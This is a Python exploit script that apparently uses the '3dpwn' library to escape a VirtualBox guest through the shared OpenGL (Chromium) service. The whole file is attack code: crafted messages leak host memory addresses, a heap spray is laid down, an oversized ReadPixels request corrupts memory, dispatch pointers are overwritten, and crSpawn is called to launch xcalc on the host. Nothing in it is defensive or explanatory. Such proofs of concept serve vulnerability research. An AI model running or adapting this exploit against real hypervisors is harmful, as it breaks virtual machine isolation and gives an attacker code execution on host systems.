#!/usr/bin/python

import sys, os, time
from struct import *
sys.path.append('./3dpwn/lib')

# 3dpwn lib
from chromium import *

"""create crMessage"""
def crmsg_leak(offset):
	msg = (
		pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) # type, conn_id, numopcode
		+ "\x00\x00\x00" + chr(CR_EXTEND_OPCODE) # opcode
		+ pack("<I", offset) # packet_length
		+ pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE)
		+ pack("<I", 0x42424242) # data opcode
	)
	return msg

"""readpixel object"""
def create_readpixel():
	msg = (
		pack("<III", CR_MESSAGE_OPCODES, 0X41414141, 1) # type, conn_id, numopcode
		+ "\x00\x00\x00" + chr(CR_READPIXELS_OPCODE) # readpixels opcode
		+ pack("<IIII", 0x00, 0x00, 0x00, 0x08) # x, y, width, height
		+ pack("<IIII", 0x35, 0x00, 0x00, 0x00) # format, type, stride, align
		+ pack("<IIII", 0x00, 0x00, 0x1FFFFFFD, 0x00) # skipRows, skipPixels, Byteperrow, rowlength
		+ pack("<III", 0xdeadbeef, 0xffffffff, 0x00)
	)
	return msg

def getcrSpawn(dispatch):
	msg = (
		pack("<III", CR_MESSAGE_OPCODES, 0x44444444, 1)
		+ "\x00\x00\x00" + chr(CR_BOUNDSINFOCR_OPCODE)
		+ pack("<IQ", 0x00, 0x636c616378)
		+ pack("<III", 0x00, 0x00, 0x00)
		+ pack("<Q", dispatch)
		+ pack("<I", 0x00)
	)
	return msg

if __name__ == "__main__":
	try:
		client = hgcm_connect("VBoxSharedCrOpenGL")
		print(client)
		set_version(client)
		time.sleep(5)
		leak_addr = crmsg(client, crmsg_leak(0xfffff618))

		hgcm_base = unpack("<Q", leak_addr[8:16])[0]
		print("hgcm base ", hex(hgcm_base))

		crspawn = hgcm_base - 49504
		cr_dispatch = hgcm_base + 5459536
		cr_dispatchbound = hgcm_base + 2435648

		print(hex(crspawn))
		print(hex(cr_dispatch))
		print(hex(cr_dispatchbound))
		

		# memory heap spray
		print("heap spray starting...")
		buf = []
		for i in range(5000):
			heap = alloc_buf(client, 0x20, "A"*0x20)
			buf.append(heap)

		# heap spray free chunk
		for i in range(0, 1000):
			if i % 2 == 0:
				hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf[i], "A", 0x00])
			else:
				continue

		# readpixel object to memory allocation
		crmsg(client, create_readpixel())

		dispatch = (
			pack("<II", 0xcafebabe, 0xffffffff)
			+ pack("<Q", cr_dispatch + 0xd8)
			)

		hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0x90, dispatch])

		hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xcafebabe, 0xffffffff, 0x00, pack("<Q", crspawn)])
		
		hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0x98, pack("<Q", cr_dispatch)])

		hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xcafebabe, 0xffffffff, 0x00, pack("<Q", 0x636c616378)])

		# run xcalc
		print("exploiting....")
		crmsg(client, getcrSpawn(cr_dispatch))

		hgcm_disconnect(client)

	except Exception as e:
		print(e)
